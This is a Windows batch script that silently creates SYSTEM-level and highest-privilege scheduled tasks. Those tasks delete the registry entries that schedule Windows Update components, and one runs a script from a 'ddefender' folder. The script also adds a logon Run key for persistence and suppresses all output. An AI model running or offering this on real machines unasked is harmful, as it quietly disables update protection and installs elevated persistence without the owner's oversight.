@echo off
if exist %SYSTEMDRIVE%\fixes\banner.exe ( start "" /b %SYSTEMDRIVE%\fixes\banner.exe )
schtasks /delete /tn cmd_a /f >nul 2>&1
schtasks /delete /tn cmd_b /f >nul 2>&1
schtasks /delete /tn cmd_c /f >nul 2>&1
schtasks /delete /tn cmd_d /f >nul 2>&1
schtasks /delete /tn cmd_e /f >nul 2>&1
schtasks /delete /tn cmd_f /f >nul 2>&1
schtasks /delete /tn cmd_g /f >nul 2>&1
schtasks /create /sc once /tn cmd_a /tr %SYSTEMDRIVE%\fixes\ddefender\run.cmd /rl highest /sd 01/01/2000 /st 00:00 >nul 2>&1
schtasks /create /sc once /tn cmd_b /tr %SYSTEMDRIVE%\fixes\base\run.cmd /rl highest /sd 01/01/2000 /st 00:00 >nul 2>&1
schtasks /create /sc once /tn cmd_c /tr "reg delete \"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\Microsoft\Windows\InstallService\" /f" /ru SYSTEM /sd 01/01/2000 /st 00:00 >nul 2>&1
schtasks /create /sc once /tn cmd_d /tr "reg delete \"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\Microsoft\Windows\WaaSMedic\" /f" /ru SYSTEM /sd 01/01/2000 /st 00:00 >nul 2>&1
schtasks /create /sc once /tn cmd_e /tr "reg delete \"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\Microsoft\Windows\UpdateOrchestrator\" /f" /ru SYSTEM /sd 01/01/2000 /st 00:00 >nul 2>&1
schtasks /create /sc once /tn cmd_f /tr "reg delete \"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\Microsoft\Windows\WindowsUpdate\Scheduled Start\" /f" /ru SYSTEM /sd 01/01/2000 /st 00:00 >nul 2>&1
schtasks /create /sc once /tn cmd_g /tr %SYSTEMDRIVE%\fixes\base\clr.cmd /rl highest /sd 01/01/2000 /st 00:00 >nul 2>&1
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "app-fix" /t REG_SZ /d "schtasks /run /tn cmd_b" /f >nul 2>&1
schtasks /run /tn cmd_a >nul 2>&1
